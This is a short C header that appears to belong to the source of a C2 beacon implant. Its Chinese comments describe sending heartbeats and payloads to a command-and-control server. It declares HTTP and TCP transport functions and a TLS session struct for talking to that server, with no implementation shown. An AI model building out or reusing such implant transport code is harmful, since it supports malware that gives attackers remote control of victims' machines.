#pragma once

#include "beacon_common.h"
#include "beacon_profile.h"

#ifndef SECURITY_WIN32
#define SECURITY_WIN32
#endif
#include <security.h>
#include <schannel.h>

/*
 * HTTP 传输交换：发送心跳+payload 到 C2，接收响应。
 * response 由调用方负责释放。
 */
INT TransportHttpExchange(const Profile* profile, const ByteBuf* metadata, const ByteBuf* payload, ByteBuf* response);

/* TCP external 传输：长度前缀帧，payload 为已加密心跳。 */
typedef struct TcpExternalSession {
    SOCKET sock;
    INT tls_enabled;
    INT tls_ready;
    INT tls_have_cred;
    CredHandle tls_cred;
    CtxtHandle tls_ctx;
    SecPkgContext_StreamSizes tls_sizes;
    ByteBuf tls_cipher_extra;
    ByteBuf tls_plain_extra;
} TcpExternalSession;

VOID TransportTcpExternalInit(TcpExternalSession* session);
VOID TransportTcpExternalClose(TcpExternalSession* session);
INT TransportTcpExternalConnect(const Profile* profile, TcpExternalSession* session);
INT TransportTcpExternalExchange(TcpExternalSession* session, const ByteBuf* payload, ByteBuf* response);
